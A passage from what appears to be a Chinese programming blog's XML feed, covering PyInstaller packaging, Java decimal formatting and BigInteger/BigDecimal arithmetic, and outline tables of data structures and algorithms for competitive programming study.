    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><blockquote><ol><li>安装python环境</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">brew install python3<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>用pip安装pyinstaller</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">pip3 install pyinstaller<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>打包成可执行文件</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">pyinstaller -F -w main.py # main为项目名称<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">-F 是打包为一个可执行文件（文件会比较大）</span><br><span class="hljs-comment">-w 是控制为没有cmd窗口的可执行文件,不加运行时就会出现cmd窗口。</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure><p>完成后，会生成一个<code>dist</code>文件夹，其中有一个可执行文件，即打包后的程序。</p><blockquote><ol start="4"><li>自定义图标</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">pyinstaller -i xxx.ico -F -w main.py <span class="hljs-comment"># main为项目名称，xxx为图标名称，且需要把ico图标放到main.py同级目录下</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1389021b73984f2b9740c68f3c8ea35c.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-JAVA保留小数点位数</title>
    <link href="/2021/07/27/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-JAVA%E4%BF%9D%E7%95%99%E5%B0%8F%E6%95%B0%E7%82%B9%E4%BD%8D%E6%95%B0/"/>
    <url>/2021/07/27/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-JAVA%E4%BF%9D%E7%95%99%E5%B0%8F%E6%95%B0%E7%82%B9%E4%BD%8D%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-String-format"><a href="#1-String-format" class="headerlink" title="1.String.format()"></a>1.String.format()</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> a = <span class="hljs-number">123.456789</span>;<br><span class="hljs-keyword">double</span> b = <span class="hljs-number">123.444444</span>;<br>String sa = String.format(<span class="hljs-string">&quot;%.2f&quot;</span>,a);<br>System.out.println(sa);<br>String sb = String.format(<span class="hljs-string">&quot;%.2f&quot;</span>,b);<br>System.out.println(sb);<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-number">123.46</span><br><span class="hljs-number">123.44</span><br><br><span class="hljs-comment">//简写</span><br>System.out.println(String.format(<span class="hljs-string">&quot;%.2f&quot;</span>,a));<br></code></pre></div></td></tr></table></figure><h2 id="2-DecimalFormat的format方法"><a href="#2-DecimalFormat的format方法" class="headerlink" title="2.DecimalFormat的format方法"></a>2.DecimalFormat的format方法</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> a = <span class="hljs-number">123.456789</span>;<br><span class="hljs-keyword">double</span> b = <span class="hljs-number">123.444444</span>;<br>DecimalFormat dfa = <span class="hljs-keyword">new</span> DecimalFormat(<span class="hljs-string">&quot;0.00&quot;</span>);<br>System.out.println(dfa.format(a));<br>DecimalFormat dfb = <span class="hljs-keyword">new</span> DecimalFormat(<span class="hljs-string">&quot;0.00&quot;</span>);<br>System.out.println(dfb.format(b));<br><br><span class="hljs-comment">//输出 </span><br><span class="hljs-number">123.46</span><br><span class="hljs-number">123.44</span><br><br><span class="hljs-comment">//简写</span><br>System.out.println(<span class="hljs-keyword">new</span> DecimalFormat(<span class="hljs-string">&quot;0.00&quot;</span>).format(a));<br></code></pre></div></td></tr></table></figure><p>DecimalFormat 类主要靠 # 和 0 两种占位符号来指定数字长度。0 表示如果位数不足则以 0 填充，# 表示只要有可能就把数字拉上这个位置。如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> a = <span class="hljs-number">123.00</span>;<br>DecimalFormat dfa = <span class="hljs-keyword">new</span> DecimalFormat(<span class="hljs-string">&quot;#.##&quot;</span>);<br>System.out.println(dfa.format(a));<br>DecimalFormat dfb = <span class="hljs-keyword">new</span> DecimalFormat(<span class="hljs-string">&quot;0.00&quot;</span>);<br>System.out.println(dfb.format(a));<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-number">123</span><br><span class="hljs-number">123.00</span><br></code></pre></div></td></tr></table></figure><h2 id="3-BigDecimal的setScale方法（了解）"><a href="#3-BigDecimal的setScale方法（了解）" class="headerlink" title="3.BigDecimal的setScale方法（了解）"></a>3.BigDecimal的setScale方法（了解）</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> f = <span class="hljs-number">111231.5585</span>;<br>BigDecimal bg = <span class="hljs-keyword">new</span> BigDecimal(f);           <br><span class="hljs-keyword">double</span> f1 = bg.setScale(<span class="hljs-number">2</span>, BigDecimal.ROUND_HALF_UP).doubleValue();   <span class="hljs-comment">//setScale已经过时        </span><br>System.out.println(f1);<br></code></pre></div></td></tr></table></figure><h2 id="4-NumberFormat的setMaximumFractionDigits方法（了解）"><a href="#4-NumberFormat的setMaximumFractionDigits方法（了解）" class="headerlink" title="4.NumberFormat的setMaximumFractionDigits方法（了解）"></a>4.NumberFormat的setMaximumFractionDigits方法（了解）</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> f = <span class="hljs-number">111231.5585</span>;<br>NumberFormat nf = NumberFormat.getNumberInstance();           <br>nf.setMaximumFractionDigits(<span class="hljs-number">2</span>);           <br>System.out.println(nf.format(f));<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-JAVA大数处理</title>
    <link href="/2021/07/26/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-JAVA%E5%A4%A7%E6%95%B0%E5%A4%84%E7%90%86/"/>
    <url>/2021/07/26/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-JAVA%E5%A4%A7%E6%95%B0%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>导包：import java,math.*;<br>或者：import java,math.BigInteger; import java,math.BigDecimal;</p><h2 id="1-整数（BigInteger类）"><a href="#1-整数（BigInteger类）" class="headerlink" title="1.整数（BigInteger类）"></a>1.整数（BigInteger类）</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Scanner cin = <span class="hljs-keyword">new</span> Scanner(System.in);<br>BigInteger a,b;<br>a = cin.nextBigInteger();<br>b = cin.nextBigInteger();<br>System.out.println(a.add(b)); <span class="hljs-comment">//加</span><br>System.out.println(a.subtract(b)); <span class="hljs-comment">//减</span><br>System.out.println(a.multiply(b)); <span class="hljs-comment">//乘</span><br>System.out.println(a.divide(b)); <span class="hljs-comment">//除</span><br><br>System.out.println(a.mod(b)); <span class="hljs-comment">//求余,不能用于小数</span><br>System.out.println(a.remainder(b)); <span class="hljs-comment">//求余</span><br><br><span class="hljs-comment">// a=7 b=3</span><br><span class="hljs-number">10</span><br><span class="hljs-number">4</span><br><span class="hljs-number">21</span><br><span class="hljs-number">2</span><br><span class="hljs-number">1</span><br><span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h2 id="2-小数（BigDecimal类）"><a href="#2-小数（BigDecimal类）" class="headerlink" title="2.小数（BigDecimal类）"></a>2.小数（BigDecimal类）</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Scanner cin = <span class="hljs-keyword">new</span> Scanner(System.in);<br>BigDecimal a,b;<br>a = cin.nextBigDecimal();<br>b = cin.nextBigDecimal();<br>System.out.println(a.add(b)); <span class="hljs-comment">//加</span><br>System.out.println(a.subtract(b)); <span class="hljs-comment">//减</span><br>System.out.println(a.multiply(b)); <span class="hljs-comment">//乘</span><br>System.out.println(a.divide(b)); <span class="hljs-comment">//除</span><br>System.out.println(a.remainder(b)); <span class="hljs-comment">//求余</span><br><span class="hljs-comment">// a=7.3 b=3.2</span><br><span class="hljs-number">10.5</span><br><span class="hljs-number">4.1</span><br><span class="hljs-number">23.36</span><br><span class="hljs-number">2.28125</span><br><span class="hljs-number">0.9</span><br></code></pre></div></td></tr></table></figure><h3 id="2-1-小数位数"><a href="#2-1-小数位数" class="headerlink" title="2.1 小数位数"></a>2.1 小数位数</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Scanner cin = <span class="hljs-keyword">new</span> Scanner(System.in);<br>BigDecimal big ;<br>big = cin.nextBigDecimal();<br>System.out.println(big.scale()); <span class="hljs-comment">//scale() 获取小数位数；若是整数则为负数，表示的末尾的0个数</span><br>System.out.println(big);<br>big = big.stripTrailingZeros(); <span class="hljs-comment">// 去掉小数末尾的无用0</span><br>System.out.println(big.scale());<br>System.out.println(big);<br><br><br><br><span class="hljs-comment">//控制台</span><br><span class="hljs-number">123.4500000</span><br><br><span class="hljs-number">7</span><br><span class="hljs-number">123.4500000</span><br><span class="hljs-number">2</span><br><span class="hljs-number">123.45</span><br><br><span class="hljs-comment">//控制台</span><br><span class="hljs-number">12340000</span><br><span class="hljs-number">0</span><br><span class="hljs-number">12340000</span><br>-<span class="hljs-number">4</span><br><span class="hljs-number">1.234E+7</span><br></code></pre></div></td></tr></table></figure><blockquote><ol><li>对一个BigDecimal设置它的scale，如果精度比原始值低，那么按照指定的方法进行四舍五入或者直接截断。</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.math.BigDecimal;<br><span class="hljs-keyword">import</span> java.math.RoundingMode;<br><br>BigDecimal d1 = <span class="hljs-keyword">new</span> BigDecimal(<span class="hljs-string">&quot;123.456789&quot;</span>);<br>BigDecimal d2 = d1.setScale(<span class="hljs-number">4</span>, RoundingMode.HALF_UP); <span class="hljs-comment">// 四舍五入</span><br>BigDecimal d3 = d1.setScale(<span class="hljs-number">4</span>, RoundingMode.DOWN); <span class="hljs-comment">// 直接截断</span><br>System.out.println(d2); <span class="hljs-comment">//123.4568</span><br>System.out.println(d3); <span class="hljs-comment">//123.4567</span><br></code></pre></div></td></tr></table></figure><p>对BigDecimal做加、减、乘时，精度不会丢失，但是做除法时，存在无法除尽的情况，这时，就必须指定精度以及如何进行截断。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">BigDecimal d1 = <span class="hljs-keyword">new</span> BigDecimal(<span class="hljs-string">&quot;123.456&quot;</span>);<br>BigDecimal d2 = <span class="hljs-keyword">new</span> BigDecimal(<span class="hljs-string">&quot;23.456789&quot;</span>);<br>BigDecimal d3 = d1.divide(d2, <span class="hljs-number">10</span>, RoundingMode.HALF_UP); <span class="hljs-comment">//保留10位小数并四舍五入</span><br>BigDecimal d4 = d1.divide(d2); <span class="hljs-comment">// 报错：ArithmeticException，因为除不尽</span><br></code></pre></div></td></tr></table></figure><p>对BigDecimal做除法的同时求余数。调用divideAndRemainder()方法时，返回的数组包含两个BigDecimal，分别是商和余数，其中商总是整数，余数不会大于除数。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">BigDecimal n = <span class="hljs-keyword">new</span> BigDecimal(<span class="hljs-string">&quot;12.345&quot;</span>);<br>BigDecimal m = <span class="hljs-keyword">new</span> BigDecimal(<span class="hljs-string">&quot;0.12&quot;</span>);<br>BigDecimal[] dr = n.divideAndRemainder(m);<br>System.out.println(dr[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 102</span><br>System.out.println(dr[<span class="hljs-number">1</span>]); <span class="hljs-comment">// 0.105</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-比较BigDecimal"><a href="#2-2-比较BigDecimal" class="headerlink" title="2.2 比较BigDecimal"></a>2.2 比较BigDecimal</h3><p>在比较两个BigDecimal的值是否相等时，要特别注意，使用equals()方法不但要求两个BigDecimal的值相等，还要求它们的scale()相等。<br>必须使用compareTo()方法来比较，它根据两个值的大小分别返回负数、正数和0，分别表示小于、大于和等于。总是使用compareTo()比较两个BigDecimal的值，不使用equals()。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">BigDecimal d1 = <span class="hljs-keyword">new</span> BigDecimal(<span class="hljs-string">&quot;123.456&quot;</span>);<br>BigDecimal d2 = <span class="hljs-keyword">new</span> BigDecimal(<span class="hljs-string">&quot;123.45600&quot;</span>);<br>System.out.println(d1.equals(d2)); <span class="hljs-comment">// false,因为scale不同</span><br>System.out.println(d1.equals(d2.stripTrailingZeros()));<span class="hljs-comment">// true,因为d2去除尾部0后scale变为2</span><br>System.out.println(d1.compareTo(d2)); <span class="hljs-comment">// 0</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
      <tag>大数处理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法学习-数据结构大纲</title>
    <link href="/2021/07/25/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BA%B2/"/>
    <url>/2021/07/25/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BA%B2/</url>
    
    <content type="html"><![CDATA[<p>纸上得来终觉浅，绝知此事要躬行。路漫漫其修远兮，吾将上下而求索！知识是经过历史的巨人沉淀下来的，别总想着自己能够快速学会，多花点时间去看看，也许会发现些不同的东西。你能快速学会的、觉得简单的东西，对于别人来说也是一样的。人外有人，天外有天。多出去走走，看看外面的世界。</p><p>（2021-07-25 记）</p><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><blockquote><p><strong>最近更新时间：2021-07-25</strong></p></blockquote><blockquote><p><strong>更新状态：持续更新中 ······</strong></p></blockquote><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><style>    tr{        text-align: center;        font-size: 18px;    }</style><table border="1">    <tr>        <th>编号</th>        <th colspan="2">名称</th>        <th>支持</th>    </tr>    <tr>        <td rowspan="7">1</td>        <td rowspan="7"><a href="https://www.tothefor.com" style="text-decoration: none">链表</a></td>        <td>单向链表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>双向链表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>循环链表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>十字链表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>双向十字链表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>块状链表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>可持久化块状链表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>2</td>        <td colspan="2">栈</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="2">3</td>        <td rowspan="2">队列</td>        <td>单调队列</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>双端队列</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>4</td>        <td colspan="2">堆(优先队列)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="2">5</td>        <td rowspan="2" colspan="">树</td>        <td>二叉树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>哈夫曼树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>6</td>        <td colspan="2">字符串</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>7</td>        <td colspan="2">散列(哈希表)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>8</td>        <td colspan="2">广义表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>9</td>        <td colspan="2">跳表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>10</td>        <td colspan="2">位运算</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>11</td>        <td colspan="2">ST表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>12</td>        <td colspan="2">二插堆</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="6">13</td>        <td rowspan="6">可并堆</td>        <td>左偏树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>可持久化左偏树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>斜堆</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>配对堆</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>斐波那契堆</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>随机堆</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>14</td>        <td colspan="2">块状树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="7">15</td>        <td rowspan="7">线段树</td>        <td>动态开点线段树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>线段树的合并</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>权值线段树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>二维线段树(线段树套线段树)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>可持久化线段树(主席树)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>主席树-静态第K大</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>主席树-动态第K大</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>16</td>        <td colspan="2">扫描树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="10">17</td>        <td rowspan="10">平衡树</td>        <td>Treap(树堆)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Fhq-Treap(无旋Treap)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>可持久化Treap</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Splay(伸展树、分裂树)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>可持久化Splay</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>红黑树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>AVL树(自平衡二叉查找树)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>替罪羊树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>SBT(节点大小平衡树)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>朝鲜树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>18</td>        <td colspan="2">BST树(二叉查找数)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>19</td>        <td colspan="2">B树(B-树)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>20</td>        <td colspan="2">B+树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>21</td>        <td>字典树(Trie树、前缀树)</td>        <td>可持久化Trie树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>22</td>        <td>后缀树</td>        <td>广义后缀树(GST)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>23</td>        <td colspan="2">划分树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>24</td>        <td colspan="2">四分数</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>25</td>        <td colspan="2">笛卡尔树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>26</td>        <td colspan="2">KDTree</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="3">27</td>        <td rowspan="3">树套树</td>        <td>线段树套平衡树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>平衡树套线段树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>线段树套线段树</td>        <td>C++/JAVA</td>    </tr>   <tr>        <td>28</td>        <td>胜者树</td>        <td>失败树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>29</td>        <td>二项树</td>        <td>二项堆</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="3">30</td>        <td rowspan="3">图论基础</td>        <td>图的存储</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>拓扑排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树链剖分</td>        <td>C++/JAVA</td>    </tr><!--    <tr>--><!--        <td>TestLook</td>--><!--        <td>C++/JAVA</td>--><!--    </tr>--></table>]]></content>
    
    
    <categories>
      
      <category>算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>ACM</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法学习-算法大纲</title>
    <link href="/2021/07/25/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E7%AE%97%E6%B3%95%E5%A4%A7%E7%BA%B2/"/>
    <url>/2021/07/25/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E7%AE%97%E6%B3%95%E5%A4%A7%E7%BA%B2/</url>
    
    <content type="html"><![CDATA[<p>纸上得来终觉浅，绝知此事要躬行。路漫漫其修远兮，吾将上下而求索！知识是经过历史的巨人沉淀下来的，别总想着自己能够快速学会，多花点时间去看看，也许会发现些不同的东西。你能快速学会的、觉得简单的东西，对于别人来说也是一样的。人外有人，天外有天。多出去走走，看看外面的世界。<br>                                                                                                                              （2021-07-25 记）</p><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><blockquote><p><strong>最近更新时间：2021-07-31</strong></p></blockquote><blockquote><p><strong>更新状态：持续更新中 ······</strong></p></blockquote><h2 id="算法大纲"><a href="#算法大纲" class="headerlink" title="算法大纲"></a>算法大纲</h2><style>    tr{        text-align: center;        font-size: 18px;    }</style><table border="1" style="border-collapse: collapse;">    <tr>        <th>编号</th>        <th colspan="2">名称</th>        <th>支持</th>    </tr>    <tr>        <td rowspan="10">1</td>        <td rowspan="10"><a href="https://www.tothefor.com" style="text-decoration: none">排序</a></td>        <td>冒泡排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>选择排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>插入排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>快速排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>归并排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>希尔排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>计数排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>基数排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>桶排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>堆排序</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>2</td>        <td colspan="">二分查找</td>        <td>三分查找</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>3</td>        <td colspan="2">贪心算法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>4</td>        <td colspan="2">枚举算法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>5</td>        <td colspan="1">分治算法</td>        <td>CDQ分治</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>6</td>        <td colspan="2">倍增算法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>7</td>        <td colspan="2">离散化</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>8</td>        <td colspan="2">模拟算法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>9</td>        <td colspan="2">MeetInTheMiddle算法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>10</td>        <td colspan="2">分块</td>        <td>C++/JAVA</td>    